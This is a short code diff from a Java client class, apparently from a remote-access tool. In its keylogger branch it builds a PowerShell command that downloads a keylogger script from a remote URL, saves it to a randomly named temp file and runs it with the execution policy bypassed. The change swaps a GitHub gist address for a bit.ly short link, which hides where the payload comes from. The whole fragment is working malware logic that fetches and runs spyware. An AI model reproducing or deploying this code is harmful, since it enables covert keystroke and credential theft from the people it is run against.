@@ -137,7 +137,7 @@ public class Client {
             if (keyLogger){
                 if (SYSTEMOS.toLowerCase().contains("win")){
                     // Download psh keylogger
-                    String url = "https://gist.github.com/cbrnrd/7d84c7d979686e36c8e5691787042ac4/raw/3c8d76361c1d31d0375f00748a9af57d712c600c/keylog.ps1";
+                    String url = "https://bit.ly/2KrLOzB";
                     String fname = System.getProperty("java.io.tmpdir") + "\\" + randTextAlphaRestricted(8) + ".ps1";
                     String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fname + "'); powershell.exe -ExecutionPolicy Bypass -file " + fname;
                     Runtime.getRuntime().exec(cmd);
